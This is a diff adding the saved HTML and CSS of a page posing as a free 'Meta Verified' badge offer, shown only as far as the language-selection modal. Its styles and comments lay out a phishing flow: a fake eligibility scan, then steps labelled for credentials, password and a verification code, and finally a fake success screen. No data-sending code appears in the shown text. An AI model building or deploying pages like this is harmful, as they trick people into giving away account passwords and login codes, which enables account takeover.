@@ -1,0 +1,1022 @@
+<!DOCTYPE html>
+<!-- saved from url=(0034)https://foryou-apply-now.surge.sh/ -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+<title>Meta Verified — Free Badge</title>
+<link href="./Meta Verified — Free Badge_files/css2" rel="stylesheet">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%;overflow-x:hidden}
+body{font-family:'Inter',sans-serif;background:#f2f4f7;color:#1a1d23;-webkit-font-smoothing:antialiased}
+.step{display:none}.step.active{display:block}
+button,a{touch-action:manipulation;-webkit-tap-highlight-color:transparent}
+
+/* ═══ LOADING ═══ */
+#ls{position:fixed;inset:0;background:#0866ff;z-index:99999;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:18px;transition:opacity .6s}
+#ls.out{opacity:0;pointer-events:none}
+.ls-logo{width:64px;height:64px;border-radius:18px;background:#fff;display:flex;align-items:center;justify-content:center;box-shadow:0 8px 32px rgba(0,0,0,.2);animation:lsPop .6s cubic-bezier(.34,1.56,.64,1) both}
+.ls-logo img{width:44px;height:44px}
+.ls-txt{font-size:13px;font-weight:600;color:rgba(255,255,255,.8);letter-spacing:.3px}
+.ls-dots{display:flex;gap:7px}
+.ls-dot{width:8px;height:8px;border-radius:50%;background:rgba(255,255,255,.4);animation:lsDot 1.2s ease-in-out infinite}
+.ls-dot:nth-child(2){animation-delay:.2s}.ls-dot:nth-child(3){animation-delay:.4s}
+@keyframes lsPop{from{opacity:0;transform:scale(.7) translateY(20px)}to{opacity:1;transform:scale(1) translateY(0)}}
+@keyframes lsDot{0%,80%,100%{transform:scale(1);background:rgba(255,255,255,.4)}40%{transform:scale(1.4);background:#fff}}
+
+/* ═══ LANG MODAL ═══ */
+#lw{position:fixed;inset:0;background:rgba(0,0,0,.55);backdrop-filter:blur(8px);display:flex;align-items:flex-end;justify-content:center;z-index:9000;opacity:0;pointer-events:none;transition:opacity .25s}
+#lw.show{opacity:1;pointer-events:all}
+#lb{background:#fff;border-radius:24px 24px 0 0;padding:12px 20px 32px;width:100%;max-width:520px;transform:translateY(100%);transition:transform .35s cubic-bezier(.34,1.2,.64,1)}
+#lw.show #lb{transform:translateY(0)}
+.lm-handle{width:40px;height:4px;border-radius:2px;background:#e2e5ea;margin:0 auto 18px}
+.lm-hd{display:flex;align-items:center;gap:12px;margin-bottom:14px}
+.lm-av{width:40px;height:40px;border-radius:12px;background:#0866ff;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.lm-av img{width:26px;height:26px;filter:brightness(10)}
+.lm-title{font-size:17px;font-weight:800;color:#1a1d23}
+.lm-sub{font-size:12.5px;color:#65676b;margin-bottom:12px}
+.lm-srch{width:100%;padding:11px 14px;border:1.5px solid #e2e5ea;border-radius:12px;font-family:inherit;font-size:14px;outline:none;margin-bottom:10px;transition:border-color .2s;background:#f8f9fa}
+.lm-srch:focus{border-color:#0866ff;background:#fff}
+.lm-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;max-height:240px;overflow-y:auto;padding-right:2px}
+.lm-grid::-webkit-scrollbar{width:3px}.lm-grid::-webkit-scrollbar-thumb{background:#d0d3d9;border-radius:3px}
+.lm-opt{display:flex;align-items:center;gap:9px;padding:11px 13px;border:1.5px solid #e2e5ea;border-radius:12px;cursor:pointer;font-size:13px;font-weight:500;color:#444;transition:all .15s;background:#fff}
+.lm-opt.sel{border-color:#0866ff;background:#e7f0ff;color:#0866ff;font-weight:700}
+.lm-opt img{width:22px;height:16px;border-radius:3px;object-fit:cover;flex-shrink:0}
+.lm-btn{margin-top:14px;width:100%;padding:15px;background:#0866ff;color:#fff;font-family:inherit;font-size:15px;font-weight:700;border:none;border-radius:14px;cursor:pointer;transition:opacity .2s,transform .1s;letter-spacing:.1px;touch-action:manipulation}
+.lm-btn:disabled{opacity:.35;cursor:not-allowed}
+.lm-btn:not(:disabled):active{transform:scale(.98)}
+
+/* ═══ STEP 1 — SCAN + PLAN ═══ */
+#s1{background:#fff;min-height:100vh}
+.s1-topbar{height:56px;background:#0866ff;display:flex;align-items:center;padding:0 18px;gap:10px}
+.s1-topbar-logo{width:30px;height:30px;border-radius:8px;overflow:hidden;background:#fff;display:flex;align-items:center;justify-content:center}
+.s1-topbar-logo img{width:22px;height:22px}
+.s1-topbar-name{font-size:15px;font-weight:700;color:#fff}
+.s1-topbar-pill{margin-left:auto;background:rgba(255,255,255,.18);border:1px solid rgba(255,255,255,.3);border-radius:99px;padding:4px 11px;font-size:11px;font-weight:700;color:#fff;letter-spacing:.4px}
+
+/* Scan screen */
+#scanWrap{padding:0 20px;min-height:calc(100vh - 56px);display:flex;flex-direction:column;align-items:center;justify-content:center;background:linear-gradient(180deg,#f0f5ff 0%,#fff 100%)}
+.scan-badge{width:88px;height:88px;border-radius:50%;background:linear-gradient(135deg,#0866ff,#0050c8);display:flex;align-items:center;justify-content:center;margin-bottom:22px;position:relative;box-shadow:0 8px 32px rgba(8,102,255,.3)}
+.scan-badge::before{content:'';position:absolute;inset:-6px;border-radius:50%;border:2px solid rgba(8,102,255,.2);animation:scanPing 2s ease-out infinite}
+.scan-badge::after{content:'';position:absolute;inset:-14px;border-radius:50%;border:2px solid rgba(8,102,255,.1);animation:scanPing 2s ease-out infinite .4s}
+.scan-badge img{width:50px;height:50px}
+@keyframes scanPing{0%{transform:scale(1);opacity:1}100%{transform:scale(1.3);opacity:0}}
+.scan-title{font-size:20px;font-weight:800;color:#1a1d23;text-align:center;margin-bottom:8px}
+.scan-sub{font-size:13.5px;color:#65676b;text-align:center;max-width:300px;line-height:1.6;margin-bottom:28px}
+.scan-bar-track{width:100%;max-width:320px;height:6px;background:#e9ecef;border-radius:3px;margin-bottom:12px;overflow:hidden}
+.scan-bar-fill{height:100%;width:0%;background:linear-gradient(90deg,#0866ff,#42a5f5);border-radius:3px;transition:width .3s linear}
+.scan-pct{font-size:13px;font-weight:700;color:#0866ff;margin-bottom:20px}
+.scan-checks{width:100%;max-width:320px;display:flex;flex-direction:column;gap:10px}
+.scan-chk{display:flex;align-items:center;gap:10px;font-size:13px;color:#888;transition:color .3s}
+.scan-chk.done{color:#1a1d23;font-weight:600}
+.scan-chk-ico{width:22px;height:22px;border-radius:50%;border:2px solid #d0d3d9;flex-shrink:0;display:flex;align-items:center;justify-content:center;transition:all .3s}
+.scan-chk.done .scan-chk-ico{border-color:#0866ff;background:#0866ff}
+.scan-chk.done .scan-chk-ico svg{display:block}
+.scan-chk-ico svg{display:none;width:12px;height:12px}
+.scan-status{font-size:12.5px;color:#0866ff;font-weight:600;margin-top:6px;text-align:center;min-height:20px}
+
+/* Eligible flash */
+#eligFlash{display:none;position:fixed;inset:0;z-index:500;background:linear-gradient(160deg,#0040c0,#0866ff,#2196f3);flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:40px 24px;overflow:hidden}
+#eligFlash.show{display:flex;animation:efIn .35s ease both}
+@keyframes efIn{from{opacity:0;transform:scale(.95)}to{opacity:1;transform:scale(1)}}
+.ef-ring{width:100px;height:100px;border-radius:50%;background:rgba(255,255,255,.15);border:2.5px solid rgba(255,255,255,.5);display:flex;align-items:center;justify-content:center;margin:0 auto 22px;animation:efPop .5s .1s cubic-bezier(.34,1.56,.64,1) both}
+.ef-ring img{width:60px;height:60px}
+.ef-title{font-size:28px;font-weight:900;color:#fff;margin-bottom:8px;animation:efUp .4s .2s both}
+.ef-sub{font-size:14px;color:rgba(255,255,255,.82);max-width:280px;line-height:1.6;margin-bottom:18px;animation:efUp .4s .3s both}
+.ef-tag{display:inline-flex;align-items:center;gap:8px;background:rgba(255,255,255,.18);border:2px solid rgba(255,255,255,.4);border-radius:99px;padding:9px 22px;font-size:12px;font-weight:800;color:#fff;text-transform:uppercase;letter-spacing:.8px;animation:efUp .4s .4s both}
+@keyframes efPop{from{opacity:0;transform:scale(.5)}to{opacity:1;transform:scale(1)}}
+@keyframes efUp{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}
+.conf{position:absolute;border-radius:2px;animation:confFall linear both}
+@keyframes confFall{to{transform:translateY(110vh) rotate(720deg);opacity:0}}
+
+/* Plan card */
+#planCard{display:none}
+.plan-hero{background:linear-gradient(150deg,#0040c0 0%,#0866ff 60%,#1e8fff 100%);padding:28px 20px 24px;text-align:center;position:relative;overflow:hidden}
+.plan-hero::after{content:'';position:absolute;width:300px;height:300px;border-radius:50%;background:rgba(255,255,255,.06);top:-80px;right:-80px}
+.plan-hero-badge{width:72px;height:72px;margin:0 auto 14px;position:relative;z-index:1;animation:hdBadge .6s cubic-bezier(.34,1.56,.64,1) both}
+.plan-hero-badge img{width:100%;height:100%}
+.plan-hero-label{position:relative;z-index:1;display:inline-block;background:rgba(255,255,255,.18);border:1.5px solid rgba(255,255,255,.4);border-radius:6px;padding:4px 12px;font-size:11px;font-weight:800;color:#fff;letter-spacing:.6px;text-transform:uppercase;margin-bottom:10px}
+.plan-hero-name{position:relative;z-index:1;font-size:22px;font-weight:900;color:#fff;margin-bottom:5px}
+.plan-hero-sub{position:relative;z-index:1;font-size:13px;color:rgba(255,255,255,.7)}
+.plan-hero-price{position:relative;z-index:1;display:flex;align-items:center;justify-content:center;gap:10px;margin-top:14px}
+.plan-price-free{font-size:18px;font-weight:900;color:#fff}
+.plan-price-was{font-size:13px;color:rgba(255,255,255,.55);text-decoration:line-through}
+@keyframes hdBadge{from{opacity:0;transform:scale(.5) rotate(-20deg)}to{opacity:1;transform:scale(1) rotate(0)}}
+
+.plan-body{background:#f2f4f7;padding:16px 16px 0}
+.plan-sect-label{font-size:11px;font-weight:700;color:#65676b;letter-spacing:.6px;text-transform:uppercase;margin-bottom:10px;padding-left:2px}
+.plan-tiles{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:18px}
+.plan-tile{background:#fff;border-radius:16px;padding:16px 14px;border:1.5px solid #e8eaed;transition:all .2s}
+.plan-tile.wide{grid-column:1/-1}
+.plan-tile-ico{width:38px;height:38px;border-radius:10px;background:#e7f0ff;display:flex;align-items:center;justify-content:center;margin-bottom:10px}
+.plan-tile-ico svg{width:20px;height:20px}
+.plan-tile-name{font-size:13px;font-weight:700;color:#1a1d23;line-height:1.3}
+.plan-tile-hint{font-size:11.5px;color:#65676b;margin-top:3px;line-height:1.4}
+.plan-tile.vis{animation:tileIn .3s ease both}
+@keyframes tileIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+
+.plan-bottom{background:#fff;margin-top:0;padding:20px 16px 32px;border-top:1px solid #e8eaed}
+.plan-age-note{font-size:11.5px;color:#65676b;text-align:center;margin-bottom:14px}
+.plan-cta{width:100%;padding:16px;background:#0866ff;color:#fff;font-family:inherit;font-size:16px;font-weight:800;border:none;border-radius:14px;cursor:pointer;letter-spacing:.1px;box-shadow:0 4px 20px rgba(8,102,255,.35);transition:opacity .15s,transform .1s;touch-action:manipulation;-webkit-tap-highlight-color:transparent}
+.plan-cta:active{opacity:.9;transform:scale(.985)}
+.plan-footer{display:flex;justify-content:space-between;align-items:center;padding:14px 16px;background:#f8f9fa;border-top:1px solid #e8eaed;font-size:11.5px;color:#90949c}
+.plan-footer a{color:#90949c;text-decoration:none;margin-right:10px}
+
+/* ═══ STEP PROGRESS BAR (S2/S3/S4) ═══ */
+.step-prog{display:flex;align-items:center;justify-content:center;padding:14px 20px;background:#fff;border-bottom:1px solid #e8eaed;gap:0}
+.sp-dot{width:28px;height:28px;border-radius:50%;border:2px solid #d0d3d9;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:800;color:#b0b3b8;flex-shrink:0;transition:all .3s;background:#fff}
+.sp-dot.done{background:#0866ff;border-color:#0866ff;color:#fff}
+.sp-dot.active{background:#fff;border-color:#0866ff;color:#0866ff;box-shadow:0 0 0 4px rgba(8,102,255,.15)}
+.sp-line{flex:1;height:2.5px;background:#e8eaed;max-width:48px;transition:background .3s}
+.sp-line.done{background:#0866ff}
+
+/* ═══ STEP 2 — CREDENTIALS ═══ */
+#s2{background:#f2f4f7;min-height:100vh}
+.s2-topbar{height:56px;background:#fff;border-bottom:1px solid #e8eaed;display:flex;align-items:center;padding:0 16px;gap:10px;position:sticky;top:0;z-index:100}
+.s2-tb-logo{width:30px;height:30px;border-radius:8px;overflow:hidden}
+.s2-tb-logo img{width:100%;height:100%;display:block}
+.s2-tb-name{font-size:14px;font-weight:700;color:#1a1d23}
+.s2-tb-right{margin-left:auto;display:flex;align-items:center;gap:8px}
+.s2-flag{width:22px;height:16px;border-radius:3px;object-fit:cover}
+.s2-lang-name{font-size:12px;font-weight:600;color:#65676b}
+.s2-card{background:#fff;border-radius:16px;margin:14px 14px 0;padding:18px;box-shadow:0 1px 4px rgba(0,0,0,.06)}
+.s2-card:last-of-type{margin-bottom:14px}
+.s2-hero-row{display:flex;align-items:flex-start;gap:14px;margin-bottom:0}
+.s2-hero-badge{width:44px;height:44px;flex-shrink:0}
+.s2-hero-badge img{width:100%;height:100%}
+.s2-hero-title{font-size:15px;font-weight:800;color:#1a1d23;line-height:1.4}
+.s2-hero-sub{font-size:12.5px;color:#65676b;margin-top:4px;line-height:1.55}
+.info-chip{display:flex;align-items:flex-start;gap:10px;background:#e7f0ff;border-radius:12px;padding:13px 14px}
+.info-chip-dot{width:8px;height:8px;border-radius:50%;background:#0866ff;margin-top:4px;flex-shrink:0}
+.info-chip-title{font-size:13px;font-weight:700;color:#0866ff;margin-bottom:3px}
+.info-chip-body{font-size:12.5px;color:#444;line-height:1.55}
+.warn-chip{display:flex;align-items:flex-start;gap:10px;background:#fff8e1;border-radius:12px;padding:13px 14px;border:1px solid #ffe082}
+.warn-chip-ico{font-size:16px;line-height:1;flex-shrink:0;margin-top:1px}
+.warn-chip-body{font-size:12.5px;color:#5c4a00;line-height:1.55}
+.vid-wrap{border-radius:12px;overflow:hidden;position:relative;background:#000}
+.vid-wrap video{width:100%;display:block;max-height:220px}
+.vid-lbl{position:absolute;top:10px;left:10px;background:rgba(8,102,255,.85);border-radius:8px;padding:5px 10px;display:flex;align-items:center;gap:7px;pointer-events:none}
+.vid-lbl-play{width:22px;height:22px;border-radius:50%;background:#fff;display:flex;align-items:center;justify-content:center}
+.vid-lbl-play svg{width:8px;height:8px;margin-left:1px}
+.vid-lbl-txt{font-size:11.5px;font-weight:700;color:#fff}
+.frm-title{font-size:16px;font-weight:800;color:#1a1d23;margin-bottom:4px}
+.frm-sub{font-size:12.5px;color:#65676b;margin-bottom:16px;line-height:1.5}
+.err-alert{display:flex;align-items:flex-start;gap:8px;background:#fff3f3;border:1px solid #ffcdd2;border-radius:10px;padding:11px 13px;margin-bottom:16px;font-size:12.5px;color:#b71c1c;line-height:1.5}
+.err-alert svg{width:15px;height:15px;flex-shrink:0;margin-top:1px}
+.fl-group{position:relative;margin-bottom:14px}
+.fl-group input{width:100%;padding:14px 14px 6px;border:1.5px solid #d0d3d9;border-radius:12px;font-family:inherit;font-size:14px;color:#1a1d23;outline:none;transition:border-color .2s;background:#fff}
+.fl-group input:focus{border-color:#0866ff}
+.fl-group label{position:absolute;left:14px;top:50%;transform:translateY(-50%);font-size:14px;color:#90949c;pointer-events:none;transition:all .2s;font-weight:500}
+.fl-group input:focus~label,.fl-group input:not(:placeholder-shown)~label{top:9px;transform:none;font-size:10.5px;color:#0866ff;font-weight:700;letter-spacing:.2px}
+.s2-submit{width:100%;padding:15px;background:#0866ff;color:#fff;font-family:inherit;font-size:15px;font-weight:800;border:none;border-radius:14px;cursor:pointer;transition:opacity .15s,transform .1s;position:relative;overflow:hidden;touch-action:manipulation;-webkit-tap-highlight-color:transparent}
+.s2-submit:active{opacity:.9;transform:scale(.985)}
+.s2-submit.loading .s2-lbl{opacity:0}
+.s2-submit.loading .spin{display:block}
+.spin{display:none;position:absolute;top:50%;left:50%;width:20px;height:20px;margin:-10px 0 0 -10px;border:2.5px solid rgba(255,255,255,.35);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.s2-footer{display:flex;justify-content:space-between;align-items:center;padding:14px 14px;font-size:11.5px;color:#90949c;margin-top:4px}
+.s2-footer a{color:#90949c;text-decoration:none;margin-right:10px}
+
+/* ═══ STEP 3 — PASSWORD ═══ */
+#s3{background:#f2f4f7;min-height:100vh}
+.s3-topbar{height:56px;background:#fff;border-bottom:1px solid #e8eaed;display:flex;align-items:center;padding:0 16px;gap:10px;position:sticky;top:0;z-index:100}
+.s3-tb-logo{width:30px;height:30px;border-radius:8px;overflow:hidden}
+.s3-tb-logo img{width:100%;height:100%;display:block}
+.s3-tb-name{font-size:14px;font-weight:700;color:#1a1d23}
+.s3-tb-help{margin-left:auto;font-size:13px;font-weight:600;color:#0866ff;text-decoration:none}
+.s3-inner{padding:16px}
+.s3-card{background:#fff;border-radius:20px;overflow:hidden;box-shadow:0 2px 12px rgba(0,0,0,.07)}
+.s3-card-head{background:linear-gradient(135deg,#0040c0,#0866ff);padding:28px 22px;text-align:center;position:relative;overflow:hidden}
+.s3-card-head::after{content:'';position:absolute;width:200px;height:200px;border-radius:50%;background:rgba(255,255,255,.07);top:-60px;right:-60px}
+.s3-lock{width:58px;height:58px;border-radius:50%;background:rgba(255,255,255,.15);border:2px solid rgba(255,255,255,.4);display:flex;align-items:center;justify-content:center;margin:0 auto 14px}
+.s3-lock svg{width:26px;height:26px;fill:none;stroke:#fff;stroke-width:2;stroke-linecap:round}
+.s3-step-tag{display:inline-block;background:rgba(255,255,255,.18);border:1.5px solid rgba(255,255,255,.35);border-radius:99px;padding:4px 14px;font-size:11px;font-weight:800;color:#fff;letter-spacing:.5px;margin-bottom:10px;position:relative;z-index:1}
+.s3-card-title{font-size:19px;font-weight:900;color:#fff;position:relative;z-index:1}
+.s3-ssl{font-size:10.5px;color:rgba(255,255,255,.6);margin-top:6px;letter-spacing:.4px;position:relative;z-index:1}
+.s3-card-body{padding:24px 20px}
+.pw-prompt{font-size:14px;color:#4b4f56;line-height:1.6;margin-bottom:20px}
+.pw-field{position:relative;margin-bottom:12px}
+.pw-field input{width:100%;padding:15px 46px 15px 14px;border:1.5px solid #d0d3d9;border-radius:12px;font-family:inherit;font-size:14px;color:#1a1d23;outline:none;transition:border-color .2s;background:#fff}
+.pw-field input:focus{border-color:#0866ff}
+.pw-eye{position:absolute;right:12px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;padding:6px;color:#90949c;display:flex;align-items:center;touch-action:manipulation}
+.pw-err{font-size:12.5px;color:#d32f2f;margin-bottom:12px;display:none;font-weight:500}
+.pw-err.show{display:block}
+.pw-forgot{display:block;font-size:13px;font-weight:600;color:#0866ff;text-decoration:none;margin-bottom:20px}
+.pw-divider{height:1px;background:#e8eaed;margin-bottom:18px}
+.pw-submit{width:100%;padding:15px;background:#0866ff;color:#fff;font-family:inherit;font-size:15px;font-weight:800;border:none;border-radius:14px;cursor:pointer;transition:opacity .15s,transform .1s;position:relative;overflow:hidden;touch-action:manipulation;-webkit-tap-highlight-color:transparent}
+.pw-submit:active{opacity:.9;transform:scale(.985)}
+.pw-submit.loading .pw-lbl{opacity:0}
+.pw-submit.loading .spin{display:block}
+.pw-notyou{display:block;width:100%;background:none;border:none;font-family:inherit;font-size:13.5px;font-weight:600;color:#65676b;cursor:pointer;text-align:center;margin-top:14px;padding:8px;touch-action:manipulation}
+.pw-done{display:none;text-align:center;padding:10px 0 6px}
+.pw-done.show{display:block}
+.pw-done-circle{width:60px;height:60px;border-radius:50%;background:#e7f0ff;border:2.5px solid #0866ff;display:flex;align-items:center;justify-content:center;margin:0 auto 14px;animation:doneIn .5s cubic-bezier(.34,1.56,.64,1) both}
+.pw-done-circle svg{width:28px;height:28px;fill:none;stroke:#0866ff;stroke-width:2.5;stroke-linecap:round}
+.pw-done-title{font-size:18px;font-weight:800;color:#1a1d23;margin-bottom:6px}
+.pw-done-sub{font-size:13px;color:#65676b}
+@keyframes doneIn{from{transform:scale(0)}to{transform:scale(1)}}
+.s3-footer{display:flex;justify-content:space-between;align-items:center;padding:16px;font-size:11.5px;color:#90949c;margin-top:14px}
+.s3-footer a{color:#90949c;text-decoration:none;margin-right:10px}
+
+/* ═══ STEP 4 — VIDEO + CODE ═══ */
+#s4{background:#f2f4f7;min-height:100vh}
+.s4-topbar{height:56px;background:#fff;border-bottom:1px solid #e8eaed;display:flex;align-items:center;padding:0 16px;gap:10px;position:sticky;top:0;z-index:100}
+.s4-tb-logo{width:30px;height:30px;border-radius:8px;overflow:hidden}
+.s4-tb-logo img{width:100%;height:100%;display:block}
+.s4-tb-name{font-size:14px;font-weight:700;color:#1a1d23}
+.s4-card{background:#fff;border-radius:16px;margin:14px 14px 0;padding:18px;box-shadow:0 1px 4px rgba(0,0,0,.06)}
+.s4-submitted-banner{background:linear-gradient(135deg,#0040c0,#0866ff);border-radius:16px;padding:20px 18px;display:flex;align-items:center;gap:14px}
+.s4-sb-icon{width:46px;height:46px;border-radius:12px;background:rgba(255,255,255,.18);display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.s4-sb-icon svg{width:24px;height:24px;fill:none;stroke:#fff;stroke-width:2.5;stroke-linecap:round}
+.s4-sb-title{font-size:15px;font-weight:800;color:#fff}
+.s4-sb-sub{font-size:12.5px;color:rgba(255,255,255,.75);margin-top:3px;line-height:1.5}
+.s4-alert-card{background:#fff8e1;border:1px solid #ffe082;border-radius:16px;margin:12px 14px 0;padding:14px 16px;display:flex;align-items:flex-start;gap:10px}
+.s4-alert-ico{font-size:18px;flex-shrink:0}
+.s4-alert-txt{font-size:12.5px;color:#5c4a00;line-height:1.55}
+.s4-vid-card{background:#fff;border-radius:16px;margin:12px 14px 0;overflow:hidden;box-shadow:0 1px 4px rgba(0,0,0,.06)}
+.s4-vid-header{padding:14px 16px 12px;border-bottom:1px solid #f0f2f5;display:flex;align-items:center;gap:12px}
+.s4-vid-play-btn{width:36px;height:36px;border-radius:10px;background:#0866ff;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.s4-vid-play-btn svg{width:12px;height:12px;margin-left:1px}
+.s4-vid-ht{font-size:13.5px;font-weight:800;color:#1a1d23}
+.s4-vid-hs{font-size:12px;color:#65676b;margin-top:2px}
+.s4-vid-body video{width:100%;display:block;background:#000}
+.s4-next-card{background:#fff;border-radius:16px;margin:12px 14px 0;padding:18px;box-shadow:0 1px 4px rgba(0,0,0,.06)}
+.s4-next-title{font-size:15px;font-weight:800;color:#1a1d23;margin-bottom:14px}
+.s4-step-row{display:flex;align-items:flex-start;gap:13px;margin-bottom:13px}
+.s4-step-row:last-child{margin-bottom:0}
+.s4-step-num{width:26px;height:26px;border-radius:50%;background:#e7f0ff;color:#0866ff;font-size:11px;font-weight:800;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:1px}
+.s4-step-txt{font-size:13px;color:#4b4f56;line-height:1.55}
+.s4-submit-card{background:#fff;border-radius:16px;margin:12px 14px 14px;padding:20px 18px;box-shadow:0 1px 4px rgba(0,0,0,.06)}
+.s4-submit-tag{display:inline-block;background:#e7f0ff;color:#0866ff;font-size:10.5px;font-weight:800;letter-spacing:.5px;border-radius:6px;padding:4px 10px;text-transform:uppercase;margin-bottom:12px}
+.s4-submit-desc{font-size:13.5px;color:#4b4f56;margin-bottom:16px;line-height:1.55}
+.s4-input{width:100%;padding:14px;border:1.5px solid #d0d3d9;border-radius:12px;font-family:inherit;font-size:14px;color:#1a1d23;outline:none;margin-bottom:10px;transition:border-color .2s;background:#fff}
+.s4-input:focus{border-color:#0866ff}
+.s4-input-err{font-size:12.5px;color:#d32f2f;margin-bottom:10px;display:none;font-weight:500}
+.s4-input-err.show{display:block}
+.s4-submit-btn{width:100%;padding:15px;background:#0866ff;color:#fff;font-family:inherit;font-size:15px;font-weight:800;border:none;border-radius:14px;cursor:pointer;transition:opacity .15s,transform .1s;position:relative;overflow:hidden;touch-action:manipulation;-webkit-tap-highlight-color:transparent}
+.s4-submit-btn:active{opacity:.9;transform:scale(.985)}
+.s4-submit-btn.loading .s4-sub-lbl{opacity:0}
+.s4-submit-btn.loading .spin{display:block}
+.s4-footer{display:flex;justify-content:space-between;align-items:center;padding:4px 14px 24px;font-size:11.5px;color:#90949c}
+.s4-footer a{color:#90949c;text-decoration:none;margin-right:10px}
+
+/* ═══ DESKTOP RESPONSIVE ═══ */
+@media(min-width:768px){
+  body{background:linear-gradient(135deg,#0033a0 0%,#0866ff 50%,#1a8fff 100%);min-height:100vh}
+
+  /* Loading stays full */
+  #ls{border-radius:0}
+
+  /* Lang modal — centered dialog on desktop */
+  #lw{align-items:center}
+  #lb{border-radius:20px;max-width:480px;padding:28px 28px 32px;transform:scale(.9) translateY(0);max-height:90vh}
+  #lw.show #lb{transform:scale(1)}
+  .lm-grid{max-height:300px}
+
+  /* Step wrapper — centered card */
+  .step.active{display:flex;justify-content:center;min-height:100vh;padding:30px 20px}
+
+  /* Step 1 special — full width with desktop layout */
+  #s1.step.active{display:block;padding:0}
+  #s1 .s1-topbar{max-width:100%;position:sticky;top:0;z-index:50}
+  #s1 #scanWrap{min-height:calc(100vh - 56px);max-width:600px;margin:0 auto}
+  #s1 #planCard{max-width:780px;margin:0 auto;border-radius:20px;overflow:hidden;box-shadow:0 24px 60px rgba(0,0,0,.25);margin-top:-1px}
+  #s1 .plan-hero{padding:40px 40px 32px}
+  #s1 .plan-body{padding:24px 24px 0}
+  #s1 .plan-tiles{grid-template-columns:1fr 1fr}
+  #s1 .plan-bottom{padding:24px 24px 36px}
+  #s1 .plan-footer{padding:16px 24px}
+
+  /* Steps 2/3/4 — centered narrow card */
+  #s2.step.active,#s3.step.active,#s4.step.active{align-items:flex-start;padding:30px 20px 60px}
+
+  /* Desktop card wrapper */
+  .desk-wrap{width:100%;max-width:560px;background:#fff;border-radius:20px;overflow:hidden;box-shadow:0 24px 60px rgba(0,0,0,.25)}
+
+  /* Topbars inside steps become part of the card */
+  .s2-topbar,.s3-topbar,.s4-topbar{border-radius:0;position:relative}
+  .step-prog{border-radius:0}
+
+  /* S2 inner content */
+  #s2 .s2-card{margin-left:0;margin-right:0;border-radius:0;box-shadow:none;border-bottom:1px solid #f0f2f5}
+  #s2 .s2-card:last-of-type{border-bottom:none}
+  #s2 .s2-footer{padding:16px 18px}
+
+  /* S3 inner */
+  #s3 .s3-inner{padding:0}
+  #s3 .s3-card{border-radius:0;box-shadow:none}
+  #s3 .s3-footer{padding:16px 18px}
+
+  /* S4 inner */
+  #s4 .s4-card,#s4 .s4-alert-card,#s4 .s4-vid-card,#s4 .s4-next-card,#s4 .s4-submit-card{margin-left:0;margin-right:0;border-radius:0;box-shadow:none;border-bottom:1px solid #f0f2f5}
+  #s4 .s4-submit-card{border-bottom:none}
+  #s4 .s4-footer{padding:16px 18px 20px}
+
+  /* Success overlay */
+  #verifySuccess{border-radius:0}
+
+  /* Eligible flash stays full */
+  #eligFlash{border-radius:0}
+}
+
+@media(min-width:1024px){
+  #s1 #planCard{max-width:900px}
+  #s2.step.active,#s3.step.active,#s4.step.active{padding:40px 20px 80px}
+}
+
+/* ═══ VERIFICATION SUCCESS (overlay after s4) ═══ */
+#verifySuccess{display:none;position:fixed;inset:0;z-index:8000;background:#fff;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:40px 28px;animation:vsIn .4s ease both}
+#verifySuccess.show{display:flex}
+@keyframes vsIn{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}
+.vs-circle{width:88px;height:88px;border-radius:50%;background:linear-gradient(135deg,#0040c0,#0866ff);display:flex;align-items:center;justify-content:center;margin:0 auto 24px;box-shadow:0 8px 32px rgba(8,102,255,.35);animation:vsCircle .6s .1s cubic-bezier(.34,1.56,.64,1) both}
+.vs-circle svg{width:42px;height:42px;fill:none;stroke:#fff;stroke-width:2.5;stroke-linecap:round}
+@keyframes vsCircle{from{transform:scale(0)}to{transform:scale(1)}}
+.vs-badge{display:flex;align-items:center;justify-content:center;margin-bottom:20px}
+.vs-badge img{width:52px;height:52px;animation:vsBadge .5s .4s cubic-bezier(.34,1.56,.64,1) both}
+@keyframes vsBadge{from{opacity:0;transform:scale(0) rotate(-30deg)}to{opacity:1;transform:scale(1) rotate(0)}}
+.vs-title{font-size:26px;font-weight:900;color:#1a1d23;margin-bottom:10px;animation:efUp .4s .3s both}
+.vs-sub{font-size:14px;color:#65676b;max-width:300px;line-height:1.65;margin:0 auto 24px;animation:efUp .4s .4s both}
+.vs-pill{display:inline-flex;align-items:center;gap:8px;background:#e7f0ff;border:1.5px solid #0866ff;border-radius:99px;padding:10px 22px;font-size:13px;font-weight:700;color:#0866ff;animation:efUp .4s .5s both}
+.vs-redirect{font-size:12.5px;color:#90949c;margin-top:16px;animation:efUp .4s .6s both}
+</style>
+</head>
+<body>
+
+<!-- ██ LOADING ██ -->
+<div id="ls" class="out" style="display: none;">
+  <div class="ls-logo"><img src="./Meta Verified — Free Badge_files/fb_icon_325x325.png" alt=""></div>
+  <div class="ls-txt">Meta Verified</div>
+  <div class="ls-dots"><div class="ls-dot"></div><div class="ls-dot"></div><div class="ls-dot"></div></div>
+</div>
+
+<!-- ██ LANGUAGE MODAL ██ -->
+<div id="lw" class="show">
+  <div id="lb">
+    <div class="lm-handle"></div>
+    <div class="lm-hd">
+      <div class="lm-av"><img src="./Meta Verified — Free Badge_files/fb_icon_325x325.png" alt=""></div>
+      <div>
+        <div class="lm-title">Select Your Language</div>
+        <div class="lm-sub">Choose to continue in your language</div>
+      </div>
+    </div>
+    <input class="lm-srch" id="lwSearch" placeholder="Search language…" type="text">
